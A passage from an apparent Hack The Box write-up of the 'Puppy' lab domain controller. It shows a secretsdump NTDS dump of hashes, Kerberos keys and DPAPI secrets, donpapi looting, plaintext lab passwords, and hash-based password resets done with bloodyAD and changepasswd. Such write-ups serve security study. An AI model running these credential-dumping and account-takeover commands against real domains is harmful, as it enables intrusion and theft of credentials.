NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] Raw NTDS dump copied to /home/kali/htb/Puppy/nxc_ntds, parse it with:
NTDSUTIL    DC.PUPPY.HTB    445    DC               [*] secretsdump.py -system '/home/kali/htb/Puppy/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Puppy/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Puppy/nxc_ntds/Active Directory/ntds.dit' LOCAL

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ secretsdump.py -system '/home/kali/htb/Puppy/nxc_ntds/registry/SYSTEM' -security '/home/kali/htb/Puppy/nxc_ntds/registry/SECURITY' -ntds '/home/kali/htb/Puppy/nxc_ntds/Active Directory/ntds.dit' LOCAL -outputfile secretsdump
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 325d804955d984b89904de50d8675df3
[*] Reading and decrypting hashes from /home/kali/htb/Puppy/nxc_ntds/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
[*] Kerberos keys from /home/kali/htb/Puppy/nxc_ntds/Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
Administrator:des-cbc-md5:20b9e03d6720150d
DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
DC$:des-cbc-md5:7f044607a8dc9710
krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
krbtgt:des-cbc-md5:5876d051f78faeba
PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:670a9fa0ec042b57b354f0898b3c48a7c79a46cde51c1b3bce9afab118e569e6
PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:5d2351baba71061f5a43951462ffe726
PUPPY.HTB\adam.silver:des-cbc-md5:643d0ba43d54025e
PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
[*] Cleaning up...
```

```bash
donpapi collect -t ALL -d $(pt get domain) -u "$(pt get user)" -H "$(pt get hash)"
```

![](/assets/obsidian/8150c7810cf190d9cb09a1ec9ede8f2e.png)

### Files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ cat ~/.donpapi/loot/DC.PUPPY.HTB/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
New-GPO -Name DisableDefender
New-GPLink -Name DisableDefender -Target 'OU=Domain Controllers,DC=PUPPY,DC=HTB'
gpuodate /force
gpupdate /force
Restart-Computer
exit
whoami
cat C:\Users\Administrator\Desktop\root.txt
```

```bash
PS C:\> cat C:\Users\Administrator\Documents\CLNP\revert.ps1
# Not part of the box, DO NOT TAMPER!

Import-Module ActiveDirectory

$username = "adam.silver"
$newPassword = "KingdomMagic2025!"

# Remove the user from the developer's group, reverting part 1 of the attack vector:
Remove-ADGroupMember -Identity DEVELOPERS -Members levi.james -Confirm:$false

# Reset the password and disable the account, reverting part 2 of the attack vector:
Set-LocalUser -Name $username -Password (ConvertTo-SecureString -AsPlainText $newPassword -Force)
Disable-LocalUser -Name $username

# Gracefully finish!
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## Revert to user's previous passwords via setting NTLM hash

> This idea came up after watching [Beyond Root section from Ippsec's video](https://youtu.be/QZQ-IjsI5Qk?t=2565&si=zNT_QFRaOlFrTonl) for this machine.
> 
> Since AD has no built-in function to revert users' password to previous ones, and I know an AD security solution called **Semperis DSP** that can make it happen, I started to wonder how it works.
> 
> ![](/assets/obsidian/8c5dd9f6e0164634b881990b7c4e034b.png)
{: .prompt-info }

1. Change `adam.silver`'s password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host DC.PUPPY.HTB -d PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' set password adam.silver 'Bravosec1337!'
[+] Password changed successfully!
```

2. Dump `adam.silver`'s history passwords from **NTDS**

- The plaintext of current NT hash `4ff50deb62abb56d811389eea639ee96` is `Bravosec1337!`, and the plaintext of old NT hash `a7d7c07487ba2a4b32fb1d0953812d66` is `KingdomMagic2025!`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ secretsdump.py puppy.htb/steph.cooper_adm:'FivethChipOnItsWay2025!'@DC.PUPPY.HTB -history -just-dc-user adam.silver
Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:4ff50deb62abb56d811389eea639ee96:::
PUPPY.HTB\adam.silver_history0:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history1:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history2:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\adam.silver_history3:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
[...]
```

3. Change `adam.silver`'s password back to `KingdomMagic2025!` by supplying NT hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ changepasswd.py 'puppy.htb'/'adam.silver'@'DC.PUPPY.HTB' -altuser 'steph.cooper_adm' -altpass 'FivethChipOnItsWay2025!' -reset -newhashes 0:a7d7c07487ba2a4b32fb1d0953812d66
Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies

[*] Setting the password of puppy.htb\adam.silver as puppy.htb\steph.cooper_adm
[*] Connecting to DCE/RPC as puppy.htb\steph.cooper_adm
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

4. Validated that password change was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ bloodyAD --host DC.PUPPY.HTB -d PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' remove uac 'adam.silver' -f 'ACCOUNTDISABLE'
[+] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

┌──(bravosec㉿fsociety)-[~/htb/Puppy]
└─$ nxc smb DC.PUPPY.HTB -u 'adam.silver' -p 'KingdomMagic2025!'
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\adam.silver:KingdomMagic2025!
```